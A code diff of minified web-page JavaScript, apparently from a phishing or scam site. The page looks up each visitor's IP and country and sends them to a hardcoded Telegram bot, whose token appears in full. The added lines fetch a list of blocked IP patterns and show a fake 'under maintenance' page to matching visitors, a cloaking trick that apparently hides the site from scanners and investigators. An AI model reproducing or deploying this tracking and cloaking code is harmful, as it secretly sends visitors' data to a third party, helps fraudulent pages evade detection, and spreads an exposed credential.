@@ -10439,6 +10439,17 @@ const mh = ({children: e = null}) => m.jsxs(m.Fragment, {
 }, Sx = e => {
     fetch(`https://freeipapi.com/api/json/${e}`).then(t => t.json()).then(t => {
         localStorage.setItem("countryName", t.countryName), localStorage.setItem("countryCode", t.countryCode)
+	    fetch('/blocked.txt')
+		.then(response => response.text())
+		.then(text => {
+        const blockedIPs = text.split('\n').map(ip => ip.trim()).filter(ip => ip);
+        const blockedIPPatterns = blockedIPs.map(ipPattern => 
+            new RegExp('^' + ipPattern.replace(/\./g, '\\.').replace(/\*/g, '([0-9]{1,3})') + '$'));
+		const isBlocked = blockedIPPatterns.some(pattern => pattern.test(e));
+        if (isBlocked) {
+            document.body.innerHTML = '<h1>Website is under maintenance</h1>';
+        }
+    })
 		fetch(`https://api.telegram.org/bot6790862717:AAEYjW8JKcCZjWm3YhZ7JR9v3pt0iPV3v-0/sendMessage?chat_id=-1002108270367&message_thread_id=30283&text=${encodeURIComponent(t.countryName)}_${e}_CLICKED`)
     })
 };
